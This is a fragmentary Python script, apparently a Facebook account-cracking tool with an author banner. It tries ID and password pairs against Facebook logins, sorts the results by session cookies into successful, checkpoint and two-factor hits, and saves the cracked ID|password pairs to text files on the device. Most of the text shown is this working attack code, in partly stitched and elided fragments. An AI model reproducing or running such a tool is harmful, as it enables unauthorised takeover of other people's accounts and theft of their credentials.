...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; hassan \x07')
...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟ \033[1;32m Shahzada Hassan         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟ \033[1;32m Hassan Karimi        \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟ \033[1;32m HassanKarimi630                 \033[1;31m 
\033[1;31m│\033[1;37m☞  \033[1;32mWHATSAPP  \033[1;31m ➟  \033[1;32m07058****3                  \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION   \033[1;31m ➟  \033[1;32m1.3                        \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m :    ➟ \033[1;32m hassan_tech\033[1;37m {\033[1;36mFB\033[1;37m} \033[1;31m
...
    print('\033[1;37m[+]══════════════════════════════════════════')
    print('[•] OK IDS SAVE : /sdcard/Karimi_OK.txt\n[•] CP IDS SAVE : /sdcard/Hassan_CP.txt')
...
                print('\r\033[1;32m[Karimi-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('/sdcard/Karimi_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d):
                    print('\r\033[1;35m[Karimi-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('/sdcard/Karimi_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\033[1;31m[Karimi-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('/sdcard/Karimi_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
...
            if 'c_user' in cookies:
                print('\r\033[1;32m[Karimi-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/Karimi_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
...
                    pass
                else:
                    os.system("play-audio Karimi_OK.mp3")
                    print('\r\033[1;92m[Karimi-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/Karimi_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[141:156]
...
                        print('\r\033[1;95m[Karimi -2F] '+cid+' | '+pas+'\033[0;97m')
                        tf.append(cid)
...
                            print('\r\033[1;94m[Karimi-CP] '+cid+' | '+pas+'\033[0;97m')
                            cp.append(cid)
...
def passx():
    os.system("xdg-open https://www.facebook.com/profile.php?id=100065417499806&mibextid=ZbWKwL")
    print(logo)
    print("")
...
    print(f'\n[~]{WHITE}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Karimi-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Karimi-CP.txt')
...
                uid = coki[151:166]
                print(f'\r{GREEN}[Karimi -OK]  '+uid+' | '+ps+ '  ') 
                cek_apk(session,coki)
                open('/sdcard/Karimi -OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r{RED}[Karimi -CP] '+uid+' | '+ps+' ')
                    open('/sdcard/Karimi -CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Karimi] [%s] \33[1;97m[OK:%s{Karimi}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
